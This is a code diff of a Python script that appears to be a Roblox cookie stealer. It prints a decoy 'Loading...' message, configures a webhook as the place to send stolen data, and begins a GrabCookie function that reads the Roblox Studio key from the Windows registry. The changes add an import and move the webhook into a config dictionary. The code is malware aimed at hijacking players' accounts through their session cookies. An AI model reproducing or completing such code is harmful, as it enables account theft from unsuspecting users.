@@ -6,12 +6,15 @@ Scripter : Mani.#0001
 import requests
 from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
 import robloxpy
+import robloxapi
 import json
 
 dummy_Message = "Loading..." #change this to whatever you want
 print(dummy_Message)
 
-webhook = "<webhook>" # put webhook here
+conf = {
+    "webhook" : WEBHOOOOOK
+}
 ################### Gathering INFOMATION #################################
 def GrabCookie():
     # opening the roblox studio key
